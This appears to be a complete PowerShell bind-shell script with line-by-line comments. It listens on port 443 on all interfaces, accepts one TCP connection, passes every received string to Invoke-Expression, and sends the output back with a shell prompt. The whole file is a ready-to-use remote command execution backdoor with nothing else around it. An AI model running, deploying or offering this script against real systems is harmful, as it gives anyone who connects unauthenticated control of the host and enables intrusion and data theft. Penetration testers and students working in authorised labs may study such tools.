$ip = '0.0.0.0'; 

$port = '443'; # Change This

$listener = New-Object System.Net.Sockets.TcpListener($ip, $port); # Create Listener Object on IP and Port Specified above

$listener.Start(); # Start Listening on IP and Port

$client = $listener.AcceptTcpClient(); # Accept Client Connection

$stream = $client.GetStream(); # Get Stream of Client Connection

[byte[]]$bytes = 0..65535|%{0}; # Create Buffer of Size 65535


# Read Data from Client
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { 
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); # Convert Bytes Read to ASCII String 
    $sendback = (Invoke-Expression $data 2>&1 | Out-String ); # Execute Data from Client and Return Result to Client
    $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "; # Add "PS" and Current Path to Result
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); # Convert Result to Bytes to Send Back to Client 
    $stream.Write($sendbyte, 0, $sendbyte.Length); # Send Back to Client 
    $stream.Flush(); # Flush Stream Buffer 
}
$client.Close(); # Close Client Connection
$listener.Stop(); # Stop Listening